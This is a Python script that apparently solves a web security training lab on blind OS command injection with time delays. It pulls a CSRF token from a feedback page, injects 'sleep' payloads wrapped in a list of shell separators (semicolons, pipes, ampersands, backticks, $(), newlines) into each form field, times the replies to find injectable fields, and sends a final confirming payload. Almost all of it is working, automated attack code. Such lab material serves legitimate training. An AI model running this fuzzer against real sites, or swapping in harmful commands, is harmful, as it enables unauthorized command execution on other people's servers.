#!/usr/bin/env python3
import argparse
import time
from pprint import pprint
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

# -----------------------------
# Config some params here
# -----------------------------
FEEDBACK_PATH = "/feedback"
SUBMIT_FEEDBACK_PATH = "/feedback/submit"

# Baseline values for feedback form
BASE_FORM_DATA = {
    "name": "test",
    "email": "test@example.com",
    "subject": "test subject",
    "message": "test message",
}

# Parameters we want to brute force (Sniper mode)
PARAMS_TO_TEST = ["name", "email", "subject", "message"]

# Payload used for timing detection (short delay) (URL-encodes automatically while sending request)
TIMING_PAYLOAD = "sleep 5"

# Final exploit payload with 10 sec delay (URL-encodes automatically while sending request)
FINAL_EXPLOIT_PAYLOAD = "sleep 10"

# Threshold in seconds to treat as "delayed" (tune per lab/network)
DELAY_THRESHOLD = 5

# raw symbols without URL-encoding
payload_base_list = [
    ";<PAYLOAD>",
    "&<PAYLOAD>",
    "&&<PAYLOAD>",
    "|<PAYLOAD>",
    "||<PAYLOAD>",
    "\n<PAYLOAD>",  # URL-encoded version is "%0a<PAYLOAD>"
    "$(<PAYLOAD>",
    "`<PAYLOAD>",
    ";<PAYLOAD>;",
    "&<PAYLOAD>&",
    "&&<PAYLOAD>&&",
    "|<PAYLOAD>|",
    "||<PAYLOAD>||",
    "\n<PAYLOAD>\n",  # URL-encoded version is "%0a<PAYLOAD>%0a"
    "<PAYLOAD>",
    "$(<PAYLOAD>)"
]

def get_csrf_from_html(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]


def send_feedback(session: requests.Session, base_url: str, data: dict) -> float:
    """Send POST /feedback/submit and return response time (seconds)."""
    submit_url = urljoin(base_url, SUBMIT_FEEDBACK_PATH)
    start = time.monotonic()
    r = session.post(submit_url, data=data, timeout=20, verify=False)
    end = time.monotonic()
    # We don't really care about the content here, only the timing
    return end - start


def exploit_with_delay(
    session: requests.Session,
    base_url: str,
    base_data: dict,
    target_param: str,
    payload: str,
    payload_base: str,
    csrf_token: str
):
    """
    Send a single exploit request with a higher delay payload
    to confirm exploitation (e.g. sleep 10).
    """
    # Clone base data each time
    data = base_data.copy()
    data["csrf"] = csrf_token

    original_value = data.get(target_param, "")
    injected_value = original_value + payload_base.replace("<PAYLOAD>", payload)
    data[target_param] = injected_value

    print(f"[*] Sending final exploit in '{target_param}' with payload '{injected_value}'...")
    response_delay = send_feedback(session, base_url, data)
    print(f"[+] Exploit response time: {response_delay:.2f}s")


def sniper_attack(
    session: requests.Session,
    base_url: str,
    base_data: dict,
    params_to_test,
    payload: str,
    delay_threshold: int,
    csrf_token: str,
    send_method
):
    """
    Intruder-like Sniper attack:
    - For each parameter in params_to_test:
      - Insert payload only into that parameter
      - Measure response time
      - If > delay_threshold, mark as potentially vulnerable
    """
    delayed_requests = []

    print("[*] Starting Sniper attack...")
    for param in params_to_test:
        for payload_base in payload_base_list:
            # Clone base data each time
            data = base_data.copy()

            data["csrf"] = csrf_token

            # Inject payload into current param
            original_value = data.get(param, "")
            injected_value = original_value + payload_base.replace("<PAYLOAD>", payload)
            data[param] = injected_value

            print(f"[*] Testing param '{param}' with payload '{injected_value}'...")
            response_delay = send_method(session, base_url, data)
            print(f"    -> Response time: {response_delay:.2f}s")

            if response_delay >= delay_threshold:
                delayed_requests.append({"param":param,
                                         "response_delay":response_delay,
                                         "payload_base":payload_base,
                                         "payload":payload})

    return delayed_requests

def main():
    parser = argparse.ArgumentParser(
        description="Lab: Blind OS command injection with time delays"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print(f"[*] Base URL: {base_url}")
    print("[*] Running timing-based Sniper attack...\n")

    # Step 1: Getting csrf token from /feedback page
    print("[*] Extracting csrf token...\n")
    feedback_url = urljoin(base_url, "/feedback")
    r = sess.get(feedback_url, timeout=10)
    csrf_token = get_csrf_from_html(r.text)
    print(f"[*] csrf token is {csrf_token}\n")

    # Step 2: Performing parameter brute force (with Intruder-like method)
    print("[*] Performing parameter brute force...\n")
    vulnerable_params = sniper_attack(
        session=sess,
        base_url=base_url,
        base_data=BASE_FORM_DATA,
        params_to_test=PARAMS_TO_TEST,
        payload=TIMING_PAYLOAD,
        delay_threshold=DELAY_THRESHOLD,
        csrf_token=csrf_token,
        send_method=send_feedback
    )

    if not vulnerable_params:
        print("\n[!] No parameters exceeded the delay threshold.")
        print("    You may need to tune DELAY_THRESHOLD, payload, or confirm manually.")
        return

    print("\n[+] Brute force finished. Potentially vulnerable parameter(s):")
    pprint(vulnerable_params)
    pass

    # Step 3: Exploit 10 sec delay
    print("[*] Performing final exploitation with 10 sec delay...\n")
    exploit_with_delay(
        session=sess,
        base_url=base_url,
        base_data=BASE_FORM_DATA,
        target_param=vulnerable_params[0]["param"],
        payload=FINAL_EXPLOIT_PAYLOAD,
        payload_base=vulnerable_params[0]["payload_base"],
        csrf_token=csrf_token)
    print("[+] Exploit payload sent. Now checkout in the browser to complete the lab.")


if __name__ == "__main__":
    main()